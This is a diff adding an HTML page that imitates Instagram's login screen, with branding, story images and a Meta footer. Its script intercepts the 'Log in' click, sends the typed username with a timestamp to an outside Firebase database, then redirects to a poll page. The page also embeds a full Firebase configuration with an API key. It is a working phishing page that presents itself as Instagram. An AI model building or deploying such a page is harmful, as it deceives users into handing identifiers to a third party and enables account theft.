@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Instagram</title>
+<link rel="stylesheet" href="style.css">
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
+</head>
+
+<body>
+
+    <!-- TOP LOGO ON MOBILE -->
+    <div class="top" style="display: flex;
+    flex-direction: column;
+    align-items: center;
+    color: #0b1e26;
+    background: #0b1e26;">
+        <p style="margin: 40px; font-weight: 100; color: #bfbfbf;">English (US)</p>
+        <img src="Instagram-logo-PNG-large-size.png" alt="" style="display: flex; height: 65px; padding: 7px; margin: 15px auto; align-items: center; justify-content: center; width: 65px;"> 
+    </div>
+
+<div class="layout">
+
+<!-- LEFT -->
+
+<section class="left">
+
+<!-- Instagram SVG Logo -->
+<svg class="logo" viewBox="0 0 24 24">
+<path fill="white"
+d="M7.75 2h8.5A5.75 5.75 0 0 1 22 7.75v8.5A5.75 5.75 0 0 1 16.25 22h-8.5A5.75 5.75 0 0 1 2 16.25v-8.5A5.75 5.75 0 0 1 7.75 2zm0 1.5A4.25 4.25 0 0 0 3.5 7.75v8.5A4.25 4.25 0 0 0 7.75 20.5h8.5a4.25 4.25 0 0 0 4.25-4.25v-8.5A4.25 4.25 0 0 0 16.25 3.5h-8.5zm4.25 3.25a5.25 5.25 0 1 1 0 10.5 5.25 5.25 0 0 1 0-10.5zm0 1.5a3.75 3.75 0 1 0 0 7.5 3.75 3.75 0 0 0 0-7.5zm5.25-.88a1.13 1.13 0 1 1 0 2.26 1.13 1.13 0 0 1 0-2.26z"/>
+</svg>
+
+<h1>
+See everyday moments from your
+<br>
+<span>close friends.</span>
+</h1>
+
+<div class="stories">
+
+<div class="story s1">
+<img src="https://picsum.photos/240/420?1">
+</div>
+
+<div class="story s2">
+<img src="https://picsum.photos/240/420?2">
+</div>
+
+<div class="story s3">
+<img src="https://picsum.photos/240/420?3">
+</div>
+
+</div>
+
+</section>
+
+<div class="divider"></div>
+
+<!-- RIGHT -->
+
+<section class="right">
+
+<div class="login">
+
+<h3>Log in to Instagram</h3>
+
+<!-- Added id for JS -->
+<input id="username" placeholder="Mobile number, username or email address">
+<input type="password" id="password" placeholder="Password">
+
+<!-- Changed buttons to links -->
+<a href="/poll.html" class="loginbtn">Log in</a>
+<a href="https://instagram.com" class="forgot">Forgotten password?</a>
+<a href="https://instagram.com" class="create">Create new account</a>
+
+<button class="facebook">
+Log in with Facebook
+</button>
+
+<div class="meta">Meta</div>
+
+</div>
+
+</section>
+
+</div>
+
+<footer>
+Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Threads
+<br><br>
+English (UK) © 2026 Instagram from Meta
+</footer>
+
+<script>
+  // YOUR FIREBASE CONFIG
+const firebaseConfig = {
+  apiKey: "AIzaSyBa_zxDn1KbbSzPYL19Pz9x9aPqOkD44pY",
+  authDomain: "insta-login-4d20f.firebaseapp.com",
+  databaseURL: "https://insta-login-4d20f-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "insta-login-4d20f",
+  storageBucket: "insta-login-4d20f.firebasestorage.app",
+  messagingSenderId: "828640518629",
+  appId: "1:828640518629:web:62c726baa5c1898b098f0c"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+const database = firebase.database();
+
+document.querySelector(".loginbtn").addEventListener("click", function(e){
+    e.preventDefault(); // stop default link behavior
+
+    const username = document.getElementById("username").value;
+
+    if(!username){
+        alert("Enter username");
+        return;
+    }
+
+    // Save to Firebase
+    database.ref("test_logins").push({
+        username: username,
+        time: new Date().toISOString()
+    })
+    .then(() => {
+        console.log("Data saved");
+        // Redirect after saving
+        window.location.href = "poll.html";
+    })
+    .catch(err => {
+        console.error("Firebase error:", err);
+    });
+});
+
+</script>
+
+</body>
+</html>
